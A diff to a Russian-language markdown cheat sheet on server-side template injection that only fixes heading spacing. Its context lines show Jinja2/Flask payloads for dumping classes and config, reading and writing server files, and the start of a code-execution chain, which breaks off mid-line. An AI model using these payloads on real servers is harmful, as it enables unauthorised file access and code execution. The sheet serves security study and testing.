@@ -30,7 +30,7 @@ Client-side / Server-side Template Injection
 Выполнение кода, введенного в шаблоне, сигнализирует о наличии данной  уязвимости.
 
 
-##Информация:
+## Информация:
 
 
 https://portswigger.net/blog/server-side-template-injection
@@ -45,7 +45,7 @@ https://defcon.ru/web-security/3840/
 ## Эксплуатация
 
 
-###Дамп всех используемых классов (Dump all used classes)
+### Дамп всех используемых классов (Dump all used classes)
 
 
 `{{ [].class.base.subclasses() }}`
@@ -54,7 +54,7 @@ https://defcon.ru/web-security/3840/
 
 `{{''.__class__.__mro__[2].__subclasses__()}}`
 
-###Дамп всех переменных конфигурации (Dump all config variables)
+### Дамп всех переменных конфигурации (Dump all config variables)
 
 
 	{% for key, value in config.iteritems() %}
@@ -62,7 +62,7 @@ https://defcon.ru/web-security/3840/
    		<dd>{{ value|e }}</dd>
 	{% endfor %}
 
-###Чтение из удаленных файлов (Reading remote files)
+### Чтение из удаленных файлов (Reading remote files)
 
 
 `''.__class__.__mro__[2].__subclasses__()[40] = File class`
@@ -73,14 +73,14 @@ https://defcon.ru/web-security/3840/
 
 
 
-###Запись в удаленные файлы (Writing into remote files)
+### Запись в удаленные файлы (Writing into remote files)
 `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt',`
 
 `'w').write('Hello here !') }}`
 
 
 
-###Удаленное выполнение кода (RCE)
+### Удаленное выполнение кода (RCE)
 
 
 `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from`
